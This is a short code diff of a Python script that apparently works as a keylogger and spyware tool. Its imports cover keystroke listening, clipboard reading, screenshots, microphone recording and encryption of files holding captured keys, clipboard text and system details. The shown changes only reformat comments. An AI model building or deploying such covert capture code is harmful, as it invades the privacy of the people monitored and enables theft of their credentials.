@@ -21,7 +21,8 @@ to identifying the users. Using getpass() it is possible to accept the password 
 '''
 import os, time, socket, platform, win32clipboard, getpass
 
-'''sounddevice:- sounddevice module provides bindings for the PortAudio library and a few convenience functions to play and record NumPy arrays containing audio signals. '''
+'''sounddevice:- sounddevice module provides bindings for the PortAudio library and a few convenience functions
+to play and record NumPy arrays containing audio signals. '''
 import sounddevice as sd
 
 ''' requests:- module for get/post requests '''
@@ -33,6 +34,9 @@ from PIL import ImageGrab
 
 ''' Twilio library for interacting with Twilio's features. '''
 from twilio.rest import Client
+
+''' SciPy is a scientific computation library that uses NumPy underneath. SciPy stands for Scientific Python.
+It provides more utility functions for optimization, stats and signal processing '''
 from scipy.io.wavfile import write
 from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
@@ -212,7 +216,8 @@ while number_of_iterations < number_of_iterations_end:
 
 ''' Encrypt Files '''
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
-encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
+encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
+                        file_merge + keys_information_e]
 
 count = 0
 
